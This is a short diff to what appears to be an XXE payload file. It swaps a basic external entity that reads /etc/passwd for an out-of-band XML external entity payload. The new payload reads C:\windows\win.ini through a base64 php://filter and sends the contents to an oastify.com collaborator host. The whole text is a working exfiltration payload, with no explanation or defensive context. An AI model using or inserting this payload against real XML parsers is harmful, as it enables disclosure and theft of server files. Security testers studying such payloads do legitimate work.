@@ -1,2 +1,4 @@
-<ENTITY file SYSTEM 'file:///etc/passwd'>
-%file;
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=C:\windows\win.ini">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://1rtnvj1faor317zhd0x3neafj6pxdq1f.oastify.com/%file;'>">
+%eval;
+%error;
